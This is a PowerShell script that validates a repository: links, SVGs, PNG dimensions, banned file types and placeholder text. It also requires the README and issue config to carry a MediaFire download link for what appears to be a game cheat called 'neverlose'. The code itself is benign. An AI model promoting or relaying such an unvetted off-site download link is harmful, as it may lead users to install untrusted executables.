[CmdletBinding()]
param()

$ErrorActionPreference = 'Stop'
$Root = (Resolve-Path -LiteralPath (Join-Path $PSScriptRoot '..')).Path.TrimEnd('\', '/')
$RootPrefix = $Root + [IO.Path]::DirectorySeparatorChar
$DownloadUrl = 'https://www.mediafire.com/folder/xpuwhpaw2jpbi/neverlose'
$Utf8 = New-Object System.Text.UTF8Encoding($false, $true)
$Errors = New-Object System.Collections.Generic.List[string]

$ForbiddenExtensions = @(
    '.exe', '.dll', '.sys', '.msi', '.scr', '.com',
    '.zip', '.rar', '.7z', '.tar', '.gz', '.iso', '.apk'
)
$ForbiddenText = @(
    'yourname', 'yourinvite', 'lorem ipsum', 'example.com'
)
$TextExtensions = @('.md', '.yml', '.yaml', '.svg', '.txt', '.json')
$TextNames = @('.editorconfig', '.gitignore')

$MarkdownLink = [regex]'!?\[[^\]]*\]\(([^)]+)\)'
$HtmlLink = [regex]'(?:src|href)="([^"]+)"'

function Get-RelativePath {
    param([string]$Path)
    if ($Path.StartsWith($RootPrefix, [StringComparison]::OrdinalIgnoreCase)) {
        return $Path.Substring($RootPrefix.Length).Replace('\', '/')
    }
    return $Path.Replace('\', '/')
}

function Read-Utf8Text {
    param([string]$Path)
    return [IO.File]::ReadAllText($Path, $Utf8)
}

function Add-Error {
    param([string]$Message)
    [void]$Errors.Add($Message)
}

function Test-MarkdownLinks {
    $files = @(Get-ChildItem -LiteralPath $Root -Recurse -File -Filter '*.md')
    foreach ($file in $files) {
        try {
            $text = Read-Utf8Text $file.FullName
        } catch {
            Add-Error "$(Get-RelativePath $file.FullName): file is not valid UTF-8"
            continue
        }

        $targets = New-Object System.Collections.Generic.List[string]
        foreach ($match in $MarkdownLink.Matches($text)) {
            [void]$targets.Add($match.Groups[1].Value)
        }
        foreach ($match in $HtmlLink.Matches($text)) {
            [void]$targets.Add($match.Groups[1].Value)
        }

        foreach ($rawTarget in $targets) {
            $target = $rawTarget.Trim()
            if ($target -match '^(#|//|mailto:|tel:)' -or $target.Contains('://')) {
                continue
            }
            $target = ($target -split '[#?]', 2)[0]
            if (-not $target) {
                continue
            }
            try {
                $target = [Uri]::UnescapeDataString($target)
            } catch {
                Add-Error "$(Get-RelativePath $file.FullName): invalid link encoding: $rawTarget"
                continue
            }

            try {
                $resolved = [IO.Path]::GetFullPath((Join-Path $file.DirectoryName $target))
            } catch {
                Add-Error "$(Get-RelativePath $file.FullName): invalid link path: $rawTarget"
                continue
            }

            if (-not ($resolved.Equals($Root, [StringComparison]::OrdinalIgnoreCase) -or
                $resolved.StartsWith($RootPrefix, [StringComparison]::OrdinalIgnoreCase))) {
                Add-Error "$(Get-RelativePath $file.FullName): link escapes repository: $rawTarget"
                continue
            }
            if (-not (Test-Path -LiteralPath $resolved)) {
                Add-Error "$(Get-RelativePath $file.FullName): missing link target: $rawTarget"
            }
        }
    }
    return $files.Count
}

function Test-SvgAssets {
    $files = @(Get-ChildItem -LiteralPath $Root -Recurse -File -Filter '*.svg')
    foreach ($file in $files) {
        try {
            $text = Read-Utf8Text $file.FullName
            [void][xml]$text
        } catch {
            Add-Error "$(Get-RelativePath $file.FullName): invalid SVG or UTF-8"
        }
    }
    return $files.Count
}

function Test-SocialPreview {
    $preview = Join-Path $Root 'assets\social-preview.png'
    if (-not (Test-Path -LiteralPath $preview)) {
        Add-Error 'assets/social-preview.png: missing social preview'
        return
    }
    $bytes = [IO.File]::ReadAllBytes($preview)
    if ($bytes.Length -lt 24) {
        Add-Error 'assets/social-preview.png: truncated PNG header'
        return
    }
    if (-not ($bytes[0] -eq 137 -and $bytes[1] -eq 80 -and $bytes[2] -eq 78 -and
        $bytes[3] -eq 71 -and $bytes[4] -eq 13 -and $bytes[5] -eq 10 -and
        $bytes[6] -eq 26 -and $bytes[7] -eq 10)) {
        Add-Error 'assets/social-preview.png: not a PNG file'
        return
    }
    $width = ([int]$bytes[16] -shl 24) -bor ([int]$bytes[17] -shl 16) -bor ([int]$bytes[18] -shl 8) -bor [int]$bytes[19]
    $height = ([int]$bytes[20] -shl 24) -bor ([int]$bytes[21] -shl 16) -bor ([int]$bytes[22] -shl 8) -bor [int]$bytes[23]
    if ($width -ne 1280 -or $height -ne 640) {
        Add-Error "assets/social-preview.png: expected 1280x640, got ${width}x${height}"
    }
}

function Test-RepositoryPolicy {
    $files = @(Get-ChildItem -LiteralPath $Root -Recurse -File)
    foreach ($file in $files) {
        if ($file.FullName -match '[\\/]\.git[\\/]') {
            continue
        }
        $relative = Get-RelativePath $file.FullName
        $extension = $file.Extension.ToLowerInvariant()
        if ($ForbiddenExtensions -contains $extension) {
            Add-Error "${relative}: executable or archive file is not allowed"
        }

        $isText = ($TextExtensions -contains $extension) -or ($TextNames -contains $file.Name)
        if (-not $isText) {
            continue
        }
        try {
            $text = Read-Utf8Text $file.FullName
        } catch {
            Add-Error "${relative}: file is not valid UTF-8"
            continue
        }
        $lower = $text.ToLowerInvariant()
        foreach ($marker in $ForbiddenText) {
            if ($lower.Contains($marker)) {
                Add-Error "${relative}: forbidden placeholder text: $marker"
            }
        }
        if (($extension -eq '.yml' -or $extension -eq '.yaml') -and $text.Contains("`t")) {
            Add-Error "${relative}: YAML contains a tab character"
        }
    }
}

function Test-RequiredContent {
    $readme = Join-Path $Root 'README.md'
    if (-not (Test-Path -LiteralPath $readme)) {
        Add-Error 'README.md: missing'
    } elseif (-not (Read-Utf8Text $readme).Contains($DownloadUrl)) {
        Add-Error 'README.md: download URL is missing'
    }

    $config = Join-Path $Root '.github\ISSUE_TEMPLATE\config.yml'
    if (-not (Test-Path -LiteralPath $config)) {
        Add-Error '.github/ISSUE_TEMPLATE/config.yml: missing'
    } elseif (-not (Read-Utf8Text $config).Contains($DownloadUrl)) {
        Add-Error '.github/ISSUE_TEMPLATE/config.yml: download URL is missing'
    }
}

$markdownCount = Test-MarkdownLinks
$svgCount = Test-SvgAssets
Test-SocialPreview
Test-RepositoryPolicy
Test-RequiredContent

Write-Output ("checked {0} Markdown files and {1} SVG assets" -f $markdownCount, $svgCount)
if ($Errors.Count -gt 0) {
    Write-Output ("validation failed with {0} error(s):" -f $Errors.Count)
    foreach ($errorItem in $Errors) {
        Write-Output "- $errorItem"
    }
    exit 1
}
Write-Output 'validation passed'
